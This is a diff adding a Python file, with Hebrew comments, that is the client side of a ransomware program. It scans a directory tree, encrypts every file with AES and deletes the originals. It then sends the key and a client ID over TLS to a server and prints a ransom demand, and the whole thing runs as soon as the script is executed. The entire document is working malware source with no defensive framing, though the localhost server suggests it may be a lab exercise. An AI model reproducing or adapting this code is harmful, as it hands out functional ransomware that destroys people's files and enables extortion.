@@ -1,0 +1,74 @@
+                                                          מי שקורא \ בודק את הקוד הזה לשים לב בבקשה שזה צד הלקוח!
+import os
+import ssl
+import socket
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+import base64
+
+client_id = "client_1234"  
+
+def encrypt_file(file_path, key):
+    """ הצפנת קובץ בשיטת AES """
+    cipher = AES.new(key, AES.MODE_CBC)
+    with open(file_path, 'rb') as f:
+        plaintext = f.read()
+    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
+    
+    iv = cipher.iv
+
+    encrypted_file_path = file_path + ".enc"
+    
+    with open(encrypted_file_path, 'wb') as f:
+        f.write(iv + ciphertext)  
+    os.remove(file_path) 
+
+def decrypt_file(file_path, key):
+    """ פענוח קובץ בשיטת AES """
+    with open(file_path, 'rb') as f:
+        iv = f.read(16)  
+        ciphertext = f.read()
+    
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
+    
+    decrypted_file_path = file_path.replace(".enc", "")
+    with open(decrypted_file_path, 'wb') as f:
+        f.write(plaintext)
+    os.remove(file_path)  
+
+def scan_files(directory):
+    """ סריקה למציאת קבצים להצפנה """
+    file_list = []
+    for root, _, files in os.walk(directory):
+        for file in files:
+            if not file.endswith(".enc"):  
+                file_list.append(os.path.join(root, file))
+    return file_list
+
+def send_key_to_server(key):
+    """ שליחת מפתח לשרת SSL """
+    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
+    context.load_verify_locations('cert.pem')
+
+    with socket.create_connection(('localhost', 12345)) as sock:
+        with context.wrap_socket(sock, server_hostname='localhost') as ssock:
+            ssock.sendall(client_id.encode('utf-8'))  
+            ssock.sendall(key) 
+
+def encrypt_and_send(files):
+    """ הצפנת כל הקבצים ושליחת המפתח לשרת """
+    key = os.urandom(32)  
+    for file_path in files:
+        encrypt_file(file_path, key)
+    
+    send_key_to_server(key)  
+
+def display_ransom_message():
+    """ הצגת הודעת כופר ללקוח """
+    print("Your files have been encrypted! To recover them, pay the ransom.")
+
+
+files_to_encrypt = scan_files("C:/path_to_directory")
+encrypt_and_send(files_to_encrypt)
+display_ransom_message()
